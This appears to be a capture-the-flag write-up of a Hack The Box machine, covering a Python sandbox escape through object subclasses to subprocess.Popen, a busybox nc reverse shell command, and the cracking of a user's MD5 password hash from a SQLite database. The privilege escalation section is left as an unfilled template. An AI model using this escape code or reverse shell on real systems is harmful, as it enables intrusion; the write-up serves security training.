Tags: 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.62
Host is up (0.021s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
```
<br>
<br>

# **Service Enumeration**
Initial scan results reveal SSH listening on port 22 and an HTTP webserver behind port 5000. Let's take a look there first:

![[Pasted image 20250324214239.png]]

We see a python code editor. There are options to register or login, but before that, I want to try and see if I can execute system commands by leveraging libraries like `os` or `subprocess`. Unfortunately, as expected, we get "Use of restricted keywords is not allowed". 

There may be a way to escape this sandbox, but to ensure we've covered everything, we'll first perform some directory brute forcing in the background with `feroxbuster` and see if creating an account does anything for us. 

>[!note]
>While the background scan was running, error rates spiked and I couldn't establish a connection to the site, meaning there must be some sort of WAF configured on the server.

I registered an account with username "test" and password "test". The only added feature we seem to get is the ability to save our scripts:

![[Pasted image 20250324215601.png]]

I'm going to try escaping the sandbox now. 

Keywords such as "import", "os", "subprocess", "builtins", "exec", and "eval" are all banned, along with many more I haven't tried, so we can't just import a module and execute a system command, or use python's builtin methods "exec" or "eval" to break out of this sandbox.  

We want to find out which builtin objects are available and which modules are loaded into memory right now. The line `().__class__.__base__.__subclasses__()` tells us just that.

>[!info] Quick breakdown of the one-liner
>1. `()` --> Creates an empty tuple instance
>2. `().__class__` --> Returns the class of the tuple (`<class 'tuple'>`)
>3. `().__class__.__base__` --> Returns the base class of "tuple", which is "object"
>4. `().__class__.__base__.__subclasses__()` --> Same as `object.__subclasses__()`, which returns a list of all classes that directly inherit from "object"
^introspection-one-liner

The following code loops through the output of that one-liner and attempts to find the "subprocess.Popen" class and its corresponding index:

```python
for i, cls in enumerate(().__class__.__base__.__subclasses__()):
    string = str(cls)
    # Notice how I didn't write "Popen" below, otherwise the code wouldn't run
    if "Pope" in string:
        print(i, cls)
```

Upon execution, the program returns:`317 <class 'subprocess.Popen'>`. 

So the subprocess module is loaded and the Popen method is available. We can assign it to a variable like "method" and treat it like a function by writing `method("<command here>", shell=True)`. It's the same thing as writing `subprocess.Popen("<command here>", shell=True)`. 

Let's test if we actually have RCE on the system. We'll run the following code:

```python
method = ().__class__.__base__.__subclasses__()[317]
command = method("echo hello world", shell=True, stdout=-1, stderr=-1)

output = command.communicate()[0]
print(output.decode())

```

>[!info] Code explanation
>Remember that index 317 of the subclasses list is where subprocess.Popen is located. 
>We assign this to a variable "method", and then treat method as that Popen function. 
>
>A simple command such as `echo hello world` is enough for verifying RCE. Setting stdout and stderr to -1 are shortcuts for subprocess.PIPE, which is required for capturing output. 
>
>`output = command.communicate()[0]` returns the stdout of the command and stores it to the output variable. Then we decode it from bytes to plaintext and print it.

Fortunately, we do in fact see "hello world" on the window on the right, meaning our RCE payload was successful. 
<br>
<br>
# **Exploitation**
## **Initial Access**
Next step is getting a reverse shell. We just need to replace our echo command with a rev shell payload. I'm going to use `busybox nc <ip address> <port> -e sh` and set up my listener:

![[Pasted image 20250324233928.png]]

After hitting run, we receive a connection and are now logged in as app-production. 

Even though we technically have user (as the user.txt file is located within app-production's home directory), there is another user on the system named Martin, as seen in the /etc/passwd file. Our next step is to try and log in as him. 

Taking a look around the `~/app` folder we're in, there is a SQLite database file in the "instance" directory:

![[Pasted image 20250324235922.png]]

It contains 2 tables, "code" and "user". The latter seemed more interesting, and contained an MD5 hash of Martin's password:

![[Pasted image 20250325000210.png]]

I pasted this into hashes.com and it found the password to be **nafeelswordsmaster**

![[Pasted image 20250325000328.png]]

I used this password to SSH into the system as Martin and was successful. 
<br>
<br>
# **Privilege Escalation**  

Document here:
* Exploit used (link to exploit)
* Explain how the exploit works 
* Any modified code (and why you modified it)
* Proof of privilege escalation (screenshot showing ip address and privileged username)
<br>
<br>
# Skills Learned
* `().__class__.__base__.__subclasses__()` is very useful when trying to **escape python sandboxes**. When builtin functions or importing modules are restricted, this line will print all builtins and modules that are already loaded in memory. Once you've found the class you're looking for and noted down the index (the position of the class in the list), you can assign it to a variable and use it as normal. See the one-liner [explanation](#^introspection-one-liner) above for a better understanding 
<br>
<br>
# Proof of Pwn
Paste link to HTB Pwn notification after owning root